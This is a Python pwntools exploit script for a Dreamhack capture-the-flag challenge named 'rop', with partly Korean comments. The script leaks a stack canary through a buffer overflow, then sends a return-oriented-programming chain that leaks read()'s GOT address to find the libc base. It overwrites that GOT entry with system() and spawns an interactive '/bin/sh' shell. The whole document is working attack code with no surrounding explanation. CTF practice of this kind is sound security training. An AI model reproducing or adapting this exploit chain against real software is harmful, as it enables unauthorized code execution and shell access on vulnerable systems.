from pwn import *
from pwn import p64
from pwn import u64

p = remote("host3.dreamhack.games", 23578)
e = ELF("./rop")
lib = ELF("./libc.so.6")

buf = b'A'*57 ########### Canary Leak Start
p.sendafter(': ', buf)
p.recvuntil(buf)
canary = u64(b'\x00'+p.recvn(7))
print('Canary:', hex(canary)) ########### Canary Leak End

read_plt = e.plt['read'] #pwntools의 ELF 명령어 링크 참고
read_got = e.got['read']
write_plt = e.plt['write']
pop_rdi = 0x400853 #ROPgadget --binary ./rop --re "pop rdi"
pop_rsi_r15 = 0x400851
ret = 0x400596 #ROPgadget --binary ./rop

payload = b'A'*56 + p64(canary) + b'B'*8 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(write_plt) #(1)payload to leak "addr of read()"
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(read_got) + p64(0) + p64(read_plt) #(2) payload of "read(0, read_got, ...)
payload += p64(pop_rdi) + p64(read_got+0x8) + p64(ret) + p64(read_plt) #(3) payload of "read("/bin/sh") == system("/bin/sh")"

p.sendafter(': ', payload)
read = u64(p.recvn(6)+b'\x00'*2) #(1) recieving "addr of read()"
lib_base = read - lib.symbols['read'] # addr of libc_base
system = lib_base + lib.symbols['system'] # addr of system()
print('read:', hex(read))
print('libc_base:', hex(lib_base))
print('system:', hex(system))

p.send(p64(system) + b"/bin/sh\x00") # (2), (3) send "addr of system()" to overwrite read_got through "read(0, read_got, 100)" & send "/bin/sh" to overwrite "read_got + 0x8"

p.interactive()